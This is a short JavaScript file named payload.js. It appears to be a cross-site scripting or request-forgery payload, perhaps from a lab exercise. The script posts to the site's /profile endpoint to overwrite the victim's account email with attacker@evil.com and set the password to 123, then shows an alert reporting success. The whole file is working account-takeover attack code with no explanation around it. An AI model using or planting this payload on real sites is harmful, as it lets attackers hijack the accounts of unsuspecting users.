// payload.js
fetch('/profile', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'email=attacker@evil.com&password=123'
})
  .then(() => alert('SUCCESS! Password has changed.\nAccount modification submitted to /profile'))
  .catch(() => alert('Request failed to send'));

